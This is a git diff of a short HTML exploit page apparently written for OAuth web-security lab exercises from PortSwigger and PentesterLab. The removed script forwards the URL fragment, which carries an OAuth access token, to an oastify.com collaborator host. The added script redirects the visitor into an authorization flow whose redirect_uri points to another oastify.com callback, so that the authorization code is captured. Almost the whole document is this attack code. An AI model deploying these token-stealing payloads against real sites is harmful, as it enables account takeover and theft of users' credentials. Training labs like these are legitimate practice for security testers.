@@ -6,9 +6,9 @@
 </head>
 
 <body>
-    <!-- Portswigger Exercise: https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect -->
+    <!-- Portswigger Exercise: https://pentesterlab.com/exercises/oauth2-csrf-auth -->
     <script>
-        window.location = 'https://nf6pkm3xnzoh8znag7nlx3h0grmkaey3.oastify.com/?' + document.location.hash.substr(1);
+        document.location = 'http://authorization-ptl-402e9b14-540bfe3a.libcurl.so?client_id=e3d96b54296176e215161cfdc4eb38e7a8ec4a602ff22b271fb836fb580cbffe&redirect_uri=https%3A%2F%2Fv1xx6up597apu79i2f9tjb382z8swpke.oastify.com%2Fcallback&response_type=code&scope=';
     </script>
 </body>
 
